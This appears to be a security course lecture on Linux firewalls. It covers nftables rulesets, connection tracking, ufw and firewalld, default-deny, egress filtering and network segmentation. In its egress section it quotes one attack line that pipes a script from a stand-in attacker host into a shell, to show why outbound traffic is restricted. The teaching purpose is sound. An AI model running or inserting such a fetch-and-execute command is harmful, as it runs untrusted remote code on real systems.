# Lecture 3 — Firewalls and Segmentation

> **Outcome:** You can describe how a Linux packet traverses `netfilter`; you can read and write a small `nftables` ruleset; you can explain default-deny and the often-forgotten direction (egress); and you can name three segmentation boundaries on a small network and the rule that enforces each.

```
┌─────────────────────────────────────────────────────────────────────┐
│  AUTHORIZED USE ONLY                                                │
│                                                                     │
│  Practice the techniques in this module only on:                    │
│  - machines and networks you own                                    │
│  - legal training platforms (TryHackMe, HackTheBox, picoCTF,        │
│    VulnHub, OverTheWire, pwn.college)                               │
│  - systems with explicit written permission from the owner          │
│                                                                     │
│  Unauthorized testing is a crime. C6 does not teach crime.          │
└─────────────────────────────────────────────────────────────────────┘
```

A firewall is a policy enforced on packets. The policy says which packets are allowed across a boundary; the enforcement happens in the kernel, on a host, on a router, on a hypervisor. This lecture covers the Linux end of that picture — the layer every defender will eventually configure, audit, or read someone else's audit of.

## 1. `iptables`, `nftables`, and the netfilter framework

Everything Linux firewalls do is built on **netfilter**, a set of kernel hooks that inspect packets at fixed points in the network stack. The hooks are: `prerouting` (just after the packet arrives), `input` (destined for this host), `forward` (passing through this host), `output` (sent by this host), and `postrouting` (just before leaving). Diagrammatically, every packet traverses one or more of these hooks; rules attached to a hook get to inspect and act on the packet.

Two userland tools configure netfilter:

- **`iptables`** (legacy) — the original interface, present since kernel 2.4 (2001). Separate binaries for IPv4 (`iptables`), IPv6 (`ip6tables`), ARP (`arptables`), bridging (`ebtables`). Verbose syntax; one rule per command; tables are `filter`, `nat`, `mangle`, `raw`, `security`. Still in widespread use; you will encounter it on legacy systems and in many Docker setups.
- **`nftables`** (modern) — the replacement, in mainline since kernel 3.13 (2014). A single tool, `nft`, handles IPv4, IPv6, ARP, and bridging. Rules are organised into tables and chains you define yourself; the syntax is closer to a small programming language. Faster (one ruleset compilation rather than per-rule evaluation), more expressive (named sets, maps, dictionaries), and the default on every modern distribution.

The transition is mostly complete by 2025. Debian and Ubuntu use `nftables` by default; Red Hat / Fedora use `nftables`. Many existing scripts still call `iptables`, but on modern distributions that command is a *compatibility shim* (`iptables-nft`) that translates to `nftables` under the hood. You can run `iptables -L -v -n` and what you see is a view of `nftables` rules.

Read this lecture's commands as `nftables` first. The `iptables` equivalents are footnoted where useful.

---

## 2. The `nftables` mental model

`nftables` has three structural concepts:

1. **Tables.** A namespace for chains and rules, scoped to an *address family* (`ip` for IPv4, `ip6` for IPv6, `inet` for both, `arp`, `bridge`, `netdev`). You create tables with names you choose: `nft add table inet filter`.
2. **Chains.** Either *base chains* (attached to a netfilter hook with a priority) or *regular chains* (called from other chains, like subroutines). A base chain at the `input` hook of the `filter` priority is where you write rules for "what is allowed to reach this host."
3. **Rules.** Statements inside a chain. Each rule has a *match* (what packets it applies to) and a *statement* (what to do — `accept`, `drop`, `reject`, `log`, `counter`, `jump`, ...).

### A minimal but real ruleset

The shape of a useful default-deny ruleset on a server:

```nft
table inet filter {
    chain input {
        type filter hook input priority filter; policy drop;

        # 1. Accept anything on loopback.
        iif "lo" accept

        # 2. Accept established and related connections.
        ct state established,related accept

        # 3. Accept ICMP / ICMPv6 (with rate limit).
        ip protocol icmp icmp type { echo-request, destination-unreachable, time-exceeded } limit rate 5/second accept
        ip6 nexthdr icmpv6 icmpv6 type { echo-request, nd-neighbor-solicit, nd-router-advert, nd-neighbor-advert } accept

        # 4. Accept SSH from a specific source.
        ip saddr 192.168.1.0/24 tcp dport 22 accept

        # 5. Log and drop the rest (rate-limited so we do not flood the journal).
        limit rate 10/minute log prefix "[nft drop input] " level info
        # implicit drop via policy
    }

    chain forward {
        type filter hook forward priority filter; policy drop;
        # this box does not forward.
    }

    chain output {
        type filter hook output priority filter; policy accept;
        # Egress filtering goes here. We will tighten this in Section 5.
    }
}
```

Read this top-to-bottom and you have the model: rules are evaluated in order; the first match decides; the chain's `policy` is the default if nothing matched. **The policy is `drop`** on `input` — that is what "default-deny" means in `nftables` syntax. Every packet not explicitly permitted is dropped.

### Loading the ruleset

Save the above as `/etc/nftables.conf`, and apply:

```bash
sudo nft -f /etc/nftables.conf
sudo systemctl enable --now nftables    # persists across reboot
sudo nft list ruleset                   # inspect the live ruleset
```

Verify it does what you expect *before* you log out of an SSH session, especially if the rules govern that SSH session. The classical "I just locked myself out of the box I am administering" mistake is right here.

---

## 3. Connection tracking and statefulness

The `ct state established,related accept` rule above is doing most of the work. Netfilter's *connection-tracking* subsystem watches every flow and maintains state: `new`, `established`, `related`, `invalid`. A *stateful* firewall uses this state — once your outgoing TCP SYN is accepted by `output`, the return SYN-ACK is in state `established` and the `input` chain accepts it without you writing a per-port rule for return traffic.

This is the central conceptual difference from a *stateless* firewall (like older `iptables` configurations that explicitly allow both directions of every flow): a stateful firewall lets you write rules in terms of *connections*, not packets. Almost every modern firewall is stateful; the exceptions are very high-performance edge devices where the per-flow state would dominate memory.

Inspect the connection-tracking table:

```bash
sudo conntrack -L                       # list active flows
sudo conntrack -S                       # summary statistics
cat /proc/sys/net/netfilter/nf_conntrack_max     # the table size
```

A common production problem: a busy server fills `nf_conntrack_max` and starts dropping new connections silently. The log message is in `dmesg`: `nf_conntrack: table full, dropping packet`. The fix is to raise the limit or to mark high-volume flows `notrack` (do not state-track them at all).

---

## 4. `ufw` and `firewalld` — the wrappers

Most learners encounter not raw `nft` but one of two wrappers:

### `ufw` (Uncomplicated Firewall) — Debian/Ubuntu

`ufw` is a small Python program that translates simple commands into `nftables` rules:

```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow from 192.168.1.0/24 to any port 22
sudo ufw enable
sudo ufw status verbose
```

`ufw` is fine for a single-purpose host. For anything more elaborate — sets of allowed IPs, rate-limited rules, multiple chains, IPv6-specific behavior — drop down to `nft` directly.

### `firewalld` — RHEL/Fedora/CentOS Stream

`firewalld` introduces the concept of **zones**: named policy contexts (`public`, `internal`, `dmz`, `home`, `work`) that map to interfaces. Each zone has its own list of allowed services and ports.

```bash
sudo firewall-cmd --get-active-zones
sudo firewall-cmd --zone=public --add-service=https --permanent
sudo firewall-cmd --zone=public --add-port=8080/tcp --permanent
sudo firewall-cmd --reload
```

`firewalld` is convenient on systems with multiple network interfaces of different trust levels: laptops on a coffee-shop network versus the home LAN; servers with a separate management interface. The zone model captures this cleanly.

Both wrappers ultimately produce `nftables` rules. Use the wrapper that matches your distribution; learn the underlying `nft` for the auditor's perspective.

---

## 5. Default-deny — the posture

A firewall is only as good as its default. The two postures:

- **Default-allow with denylist.** "Anything is allowed unless I have specifically forbidden it." Easy to set up. *Impossible* to maintain securely: every new threat requires a new rule, and you discover the threat only after it is exploited.
- **Default-deny with allowlist.** "Nothing is allowed unless I have specifically permitted it." Harder to set up — you must enumerate everything legitimate. Easier to maintain securely: anything new is denied by default; legitimate additions are visible and reviewed.

Every credible firewall configuration in 2025 is default-deny. The discipline:

1. Set the chain policy to `drop` (or `reject` if you want callers to see "connection refused" rather than silent timeouts).
2. Write rules that *allow* specifically-required traffic.
3. End with a logging rule so you can see what is being dropped — both to refine the allowlist and to spot scans.

The legitimate fear is that you misjudge the allowlist and break a service. Mitigations:

- **Test with logging-only** (`policy accept` plus a `log` rule on every prospective `drop`) for a day or two, then flip the policy.
- **Stage the change** on a single host, not the whole fleet.
- **Have an out-of-band reset path** — a console, a serial port, a hypervisor's "stop and restart with empty firewall" knob — for when you lock yourself out anyway.

---

## 6. Egress filtering — the often-forgotten direction

Most firewalls people configure restrict *inbound* traffic — what reaches the host from the internet. The *outbound* direction (what the host can connect to) is usually left wide open. This is the single most common firewall misconfiguration in real environments, and the one attackers exploit after the initial foothold.

A compromised host with unrestricted egress can:

- **Pull tooling.** `curl http://attacker.example/payload.sh | sh` is the classical second-stage technique.
- **Beacon home.** The malware connects out to a command-and-control server. If outbound is unrestricted, this just works.
- **Exfiltrate data.** Stream a database dump over HTTP, FTP, DNS, IRC — anything outbound.
- **Pivot.** SSH from the compromised host into the next subnet.

Egress filtering — restricting *where* the host can connect *to* — limits all four. A web server probably needs to connect to your database and your monitoring system. It probably does not need to reach the entire internet. Express that:

```nft
chain output {
    type filter hook output priority filter; policy drop;

    # 1. Loopback.
    oif "lo" accept

    # 2. Established connections.
    ct state established,related accept

    # 3. New outbound to documented destinations only.
    ct state new ip daddr { 10.0.1.50 } tcp dport 5432 accept       # the database
    ct state new ip daddr { 10.0.2.10 } udp dport 514 accept        # syslog
    ct state new tcp dport 53 accept                                # DNS
    ct state new udp dport 53 accept                                # DNS
    ct state new tcp dport { 80, 443 } ip daddr { ... } accept       # named CDN/update endpoints

    # 4. Log and drop everything else.
    limit rate 10/minute log prefix "[nft drop output] " level info
}
```

Egress filtering is harder than ingress filtering — you have to know what your application legitimately connects to, in advance, and keep that list current. The payoff is real. A 2023 SANS survey of breach reports finds that egress restrictions would have meaningfully slowed or prevented the second stage in a majority of "drive-by compromise" cases.

The pragmatic compromise on developer workstations: log first, restrict later. On production servers: restrict from day one, and the application's deployment list lives in version control next to the firewall ruleset.

---

## 7. Network segmentation — the structural layer

A firewall on every host is the *host-level* part of segmentation. The *network-level* part is dividing your network into zones with controlled crossings.

The terminology:

- **Subnet.** A layer-3 division. Two subnets are reachable from each other only via a router; the router can enforce policy at that hop.
- **VLAN.** A layer-2 division. One physical switch carries multiple logical broadcast domains. Hosts on different VLANs cannot ARP each other; they must go through a router.
- **DMZ.** A "demilitarised zone" — a subnet exposed to the internet but separated from the internal network by a firewall. Anything that has to be internet-reachable lives here; anything internal does not.
- **Jump host / bastion.** A single hardened host through which all administrative access flows. Internal hosts deny SSH from anywhere except the bastion. Useful audit and choke-point properties.
- **Zero-trust.** The architectural movement to *not* rely on network position for trust. Every connection authenticates and authorizes regardless of which subnet the caller is on. NIST SP 800-207 is the reference.

On a home network, you can apply this with one or two boundaries:

- **Boundary 1:** the WAN/LAN boundary at your router. Inbound is default-deny; outbound is wide open (typically). Some home routers offer per-device egress controls; few people use them.
- **Boundary 2:** a "guest" or "IoT" subnet. Smart speakers, TV, vacuum cleaner — devices that need internet but not your laptop. Many modern home routers support this with a single setting. The IoT subnet is firewalled from the main LAN.
- **Boundary 3:** the host firewall on each laptop, server, NAS. Restrict inbound to documented services only. (This is the layer your `nftables` ruleset implements.)

On a corporate network, the same principle extends to dozens of zones. The defender's habit is the same: name the boundary, name the rule that enforces it, audit both quarterly.

---

## 8. The auditing habit

A firewall ruleset rots. Hosts come and go, services move, scripts add temporary rules that never get removed. Audit yours:

```bash
# inspect live ruleset
sudo nft list ruleset

# count matches per rule (the 'counter' statement adds this)
sudo nft list ruleset -a -nn

# dump for diffing / version control
sudo nft list ruleset > /tmp/nftables-$(date +%F).bak
```

Keep the ruleset in version control. Every change is a diff with a justification. The audit becomes a `git log` review.

Two specific habits:

1. **A rule with zero matches over a long window is suspicious.** Either you do not need it, or the traffic it was meant to allow is silently dropped elsewhere.
2. **A rule with surprising matches is the lead in an investigation.** The "drop everything else" rule should mostly catch scanners. If it catches your own traffic, something inside has changed.

---

## 9. Self-check

Without re-reading:

1. Name the five netfilter hooks and which direction of traffic each sees.
2. What is the difference between a *base chain* and a *regular chain* in `nftables`?
3. State, in one sentence, what "default-deny" means and why it is the only credible posture for an internet-facing host.
4. Why is the `ct state established,related accept` rule sufficient for return traffic on a stateful firewall?
5. Give one example of an attack stage that egress filtering prevents or slows.
6. What is the difference between a subnet and a VLAN?
7. On a home network, name two segmentation boundaries you can implement with consumer equipment and one rule that enforces each.
8. Why is `ufw` not appropriate for a host with complex requirements? Name one concrete `nftables` feature `ufw` does not expose.

---

## Further reading

- **`nftables` wiki** — the authoritative documentation: <https://wiki.nftables.org/wiki-nftables/index.php/Main_Page>
- **The netfilter packet-flow diagram** — every Linux firewall author has this open: <https://en.wikipedia.org/wiki/File:Netfilter-packet-flow.svg>
- **NIST SP 800-41 Rev. 1 — Guidelines on Firewalls and Firewall Policy**: <https://csrc.nist.gov/publications/detail/sp/800-41/rev-1/final>
- **NIST SP 800-207 — Zero Trust Architecture**: <https://csrc.nist.gov/publications/detail/sp/800-207/final>

Next, the [exercises](../exercises/README.md). Then the [PCAP-decode challenge](../challenges/challenge-01-decode-a-pcap.md). Then the [mini-project](../mini-project/README.md).
